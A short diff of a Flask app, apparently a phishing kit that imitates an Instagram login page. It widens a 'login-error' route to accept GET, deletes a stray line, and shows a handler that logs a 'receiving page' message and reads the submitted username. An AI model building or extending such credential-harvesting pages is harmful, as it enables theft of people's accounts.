@@ -167,9 +167,8 @@ def insta():
 
 
 
-@app.route("/instagram-login-error", methods=['POST'])
+@app.route("/instagram-login-error", methods=['POST', 'GET'])
 def instadata():
-       request.re
        message("instagram resiveing  page opened !? \n")
    
        user_name = request.form.get("username")  
